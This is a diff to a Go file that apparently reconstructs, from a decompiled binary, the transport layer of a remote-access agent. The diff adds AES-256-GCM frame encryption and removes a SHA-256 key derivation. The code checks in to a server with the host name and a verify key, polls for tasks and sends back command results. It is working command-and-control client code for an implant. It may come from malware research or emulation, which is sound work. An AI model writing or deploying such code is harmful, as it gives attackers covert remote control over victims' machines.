@@ -7,13 +7,12 @@ package main
 //     refcount +0x8c, conn chain +0x48, global pool DAT_1e4909c8)
 //   - connect core: FUN_00fc9de0 (mode dispatch WS=2 / TCP, dial loop with
 //     bounded retry/backoff, register token 0xc48d)
-//   - wire: <u32 LE len><[16B IV][ct]> (message_wire.go encryptFrame)
+//   - wire: <u32 LE len><AES-256-GCM frame> (message_wire.go encryptFrame)
 //
 // This mirrors the mapped pool structure; the socket dialect (KCP vs raw
 // TCP) is selected by the server listener mode.
 
 import (
-	"crypto/sha256"
 	"encoding/binary"
 	"encoding/json"
 	"errors"
@@ -35,10 +34,8 @@ type poolEntry struct {
 
 // realConn is a single transport connection with its send/receive state.
 type realConn struct {
-	mu       sync.Mutex
-	nc       net.Conn
-	sessKeys sessionKeys
-	counter  messageCounter
+	mu sync.Mutex
+	nc net.Conn
 }
 
 // transportReal is the pooled transport (FUN_00fc7560 semantics).
@@ -91,11 +88,12 @@ func (t *transportReal) connectCore() (*realConn, error) {
 	return nil, lastErr
 }
 
-// sendFrame encrypts payload (message_wire.go) and writes <u32 LE len><frame>.
-func (c *realConn) sendFrame(sk *sessionKeys, counter *messageCounter, payload []byte) error {
+// sendFrame encrypts payload (AES-256-GCM, message_wire.go) and writes
+// <u32 LE len><frame>.
+func (c *realConn) sendFrame(payload []byte) error {
 	c.mu.Lock()
 	defer c.mu.Unlock()
-	msg := encryptFrame(sk, counter, payload)
+	msg := encryptFrame(payload)
 	if err := c.nc.SetWriteDeadline(time.Now().Add(15 * time.Second)); err != nil {
 		return err
 	}
@@ -103,7 +101,7 @@ func (c *realConn) sendFrame(sk *sessionKeys, counter *messageCounter, payload [
 	return err
 }
 
-// readFrame reads <u32 LE len><frame> and returns the frame.
+// readFrame reads <u32 LE len><AES-256-GCM frame> and returns the plaintext.
 func (c *realConn) readFrame() ([]byte, error) {
 	c.mu.Lock()
 	defer c.mu.Unlock()
@@ -122,18 +120,7 @@ func (c *realConn) readFrame() ([]byte, error) {
 	if _, err := io.ReadFull(c.nc, frame); err != nil {
 		return nil, err
 	}
-	return frame, nil
-}
-
-// deriveSessionKeys derives the session key material from the config
-// (binary: key0/key2 at 0xbb20e0/0xbb20f0 are runtime-populated from the
-// checkin config; here we derive a stable 32B session key).
-func deriveSessionKeys(verify, salt string) sessionKeys {
-	h := sha256.Sum256([]byte(salt + ":" + verify))
-	var sk sessionKeys
-	copy(sk.key0[:], h[:16])
-	copy(sk.key2[:], h[16:32])
-	return sk
+	return decryptFrame(frame)
 }
 
 // newRealTransport creates a pooled TCP transport (main.go "tcp"/"raw" mode).
@@ -153,9 +140,6 @@ func (r *realTransport) Checkin() (*CheckinResponse, error) {
 	if err != nil {
 		return nil, err
 	}
-	if conn.sessKeys.key0 == [16]byte{} {
-		conn.sessKeys = deriveSessionKeys(r.inner.cfg.verify, r.inner.cfg.salt)
-	}
 	req := CheckinRequest{
 		VerifyKey:   VerifyKey,
 		HostName:    hostname,
@@ -168,19 +152,17 @@ func (r *realTransport) Checkin() (*CheckinResponse, error) {
 		Version:     agentVersion,
 	}
 	body, _ := json.Marshal(req)
-	if err := conn.sendFrame(&conn.sessKeys, &conn.counter, body); err != nil {
+	if err := conn.sendFrame(body); err != nil {
 		return nil, err
 	}
 	frame, err := conn.readFrame()
 	if err != nil {
 		return nil, err
 	}
-	// frame = [16B IV][ct]; strip IV, decrypt not yet available — return raw
+	// frame = plaintext JSON (readFrame decrypts AES-256-GCM)
 	var cr CheckinResponse
-	if len(frame) > 16 {
-		if err := json.Unmarshal(frame[16:], &cr); err == nil && cr.ClientID > 0 {
-			clientID = cr.ClientID
-		}
+	if err := json.Unmarshal(frame, &cr); err == nil && cr.ClientID > 0 {
+		clientID = cr.ClientID
 	}
 	return &cr, nil
 }
@@ -192,7 +174,7 @@ func (r *realTransport) GetTasks() ([]TaskItem, error) {
 		return nil, err
 	}
 	req, _ := json.Marshal(map[string]interface{}{"type": "task_poll", "client_id": clientID, "verify_key": VerifyKey})
-	if err := conn.sendFrame(&conn.sessKeys, &conn.counter, req); err != nil {
+	if err := conn.sendFrame(req); err != nil {
 		return nil, err
 	}
 	frame, err := conn.readFrame()
@@ -200,13 +182,11 @@ func (r *realTransport) GetTasks() ([]TaskItem, error) {
 		return nil, err
 	}
 	var tr TaskResponse
-	if len(frame) > 16 {
-		if err := json.Unmarshal(frame[16:], &tr); err == nil {
-			if tr.Interval > 0 {
-				sleepTime = tr.Interval
-			}
-			return tr.Tasks, nil
+	if err := json.Unmarshal(frame, &tr); err == nil {
+		if tr.Interval > 0 {
+			sleepTime = tr.Interval
 		}
+		return tr.Tasks, nil
 	}
 	return nil, nil
 }
@@ -218,7 +198,7 @@ func (r *realTransport) SendResult(taskID int64, result, status string) error {
 		return err
 	}
 	req, _ := json.Marshal(ResultRequest{ClientID: clientID, CommandID: taskID, Result: result, Status: status, VerifyKey: VerifyKey})
-	return conn.sendFrame(&conn.sessKeys, &conn.counter, req)
+	return conn.sendFrame(req)
 }
 
 // Close closes the pooled connection.
